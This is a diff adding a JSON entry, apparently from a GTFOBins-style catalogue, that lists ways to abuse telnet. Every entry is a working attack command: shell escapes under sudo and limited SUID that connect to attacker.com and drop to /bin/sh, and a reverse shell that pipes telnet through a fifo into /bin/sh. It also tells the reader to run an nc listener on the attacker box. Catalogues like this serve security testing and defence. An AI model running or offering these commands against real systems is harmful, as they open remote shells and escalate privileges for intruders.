@@ -1,0 +1,28 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "description": "BSD version only. Needs to be connected first.",
+        "code": "RHOST=attacker.com\nRPORT=12345\ntelnet $RHOST $RPORT\n^]\n!/bin/sh\n"
+      }
+    ],
+    "reverse-shell": [
+      {
+        "description": "Run `nc -l -p 12345` on the attacker box to receive the shell.",
+        "code": "RHOST=attacker.com\nRPORT=12345\nTF=$(mktemp -u)\nmkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "BSD version only. Needs to be connected first.",
+        "code": "RHOST=attacker.com\nRPORT=12345\nsudo telnet $RHOST $RPORT\n^]\n!/bin/sh\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        "description": "BSD version only. Needs to be connected first.",
+        "code": "RHOST=attacker.com\nRPORT=12345\n./telnet $RHOST $RPORT\n^]\n!/bin/sh\n"
+      }
+    ]
+  }
+}
